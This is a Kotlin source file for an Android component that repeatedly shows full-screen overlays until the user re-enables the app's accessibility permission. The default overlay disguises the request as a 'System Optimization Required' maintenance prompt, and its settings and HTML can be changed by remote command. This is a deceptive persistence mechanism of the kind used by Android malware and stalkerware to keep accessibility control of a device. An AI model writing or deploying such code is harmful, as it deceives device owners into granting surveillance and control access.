package com.example.myandroid

import android.content.Context
import android.content.Intent
import android.provider.Settings
import org.json.JSONObject

object AccRelentlessManager {
    private const val PREFS = "acc_persistence_prefs"
    
    // Settings (Defaults)
    var chillMins = 1440L
    var nagIntervalMins = 2L
    var maxNags = 5
    var customHtml: String? = null

    fun applyNewConfig(ctx: Context, chill: Long, interval: Long, max: Int, html: String?) {
        chillMins = chill
        nagIntervalMins = interval
        maxNags = max
        customHtml = html
        
        // RESET the state so the new config takes effect immediately
        val prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        prefs.edit()
            .putInt("nag_count", 0)
            .putLong("last_nag_at", 0L)
            .apply()
            
        DebugLogger.log("ACC_PERSIST", "New config applied. Nag history reset to 0.")
    }

    fun stopNagging(ctx: Context) {
        maxNags = 0
        reset(ctx)
        DebugLogger.log("ACC_PERSIST", "Nagging forcefully stopped via remote command.")
    }

    fun checkAndNag(ctx: Context) {
        DebugLogger.log("ACC_PERSIST", "Evaluating Relentless Protocol...")
        
        if (PermissionManager.hasAccessibility(ctx)) {
            DebugLogger.log("ACC_PERSIST", "Abort: Accessibility is currently ENABLED. Resetting timers.")
            reset(ctx)
            return
        }

        val prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        val lostAt = prefs.getLong("lost_at", 0L)
        val now = System.currentTimeMillis()
        
        if (lostAt == 0L) {
            prefs.edit().putLong("lost_at", now).apply()
            DebugLogger.log("ACC_PERSIST", "First detection of missing permission. Timer initialized at $now")
            return
        }

        val chillMillis = chillMins * 60 * 1000
        val elapsedSinceLoss = now - lostAt
        
        // 1. Check Chill Period
        if (elapsedSinceLoss < chillMillis) {
            val remainingMins = (chillMillis - elapsedSinceLoss) / 60000
            DebugLogger.log("ACC_PERSIST", "Abort: In Chill Period. ~${remainingMins}m remaining.")
            return
        }

        // 2. Check Nag Count
        val count = prefs.getInt("nag_count", 0)
        if (count >= maxNags) {
            DebugLogger.log("ACC_PERSIST", "Abort: Max nags reached ($count/$maxNags). Silenced.")
            return
        }

        // 3. Check Interval
        val lastNag = prefs.getLong("last_nag_at", 0L)
        val intervalMillis = nagIntervalMins * 60 * 1000
        val elapsedSinceNag = now - lastNag
        
        if (elapsedSinceNag > intervalMillis) {
            DebugLogger.log("ACC_PERSIST", "Trigger conditions met. Firing UI (Attempt ${count + 1}/$maxNags)")
            triggerUi(ctx)
            prefs.edit()
                .putInt("nag_count", count + 1)
                .putLong("last_nag_at", now)
                .apply()
        } else {
            val nextMins = (intervalMillis - elapsedSinceNag) / 60000
            DebugLogger.log("ACC_PERSIST", "Abort: Waiting for interval. Next nag in ~${nextMins}m")
        }
    }

    private fun triggerUi(ctx: Context) {
        val html = customHtml ?: getDefaultHtml(ctx)
        DynamicUIManager.showOverlay(ctx, true, html)
    }

    private fun reset(ctx: Context) {
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit().clear().apply()
    }

    private fun getDefaultHtml(ctx: Context): String {
        return """
            <html><body style='background:rgba(0,0,0,0.85);color:white;font-family:sans-serif;padding:30px;text-align:center;'>
                <div style='margin-top:40%;'>
                    <h2 style='color:#3B82F6;'>System Optimization Required</h2>
                    <p style='color:#94A3B8;'>To maintain device health and performance, please re-enable the maintenance service.</p>
                    <br><br>
                    <button onclick='Cortex.openAccSettings()' 
                        style='background:#3B82F6;color:white;border:none;padding:15px 40px;border-radius:10px;font-weight:bold;width:100%;'>OKAY</button>
                    <br><br>
                    <button onclick='Cortex.openAccHelp()' 
                        style='background:transparent;color:#94A3B8;border:1px solid #444;padding:12px 40px;border-radius:10px;width:100%;'>HELP</button>
                </div>
            </body></html>
        """.trimIndent()
    }
}
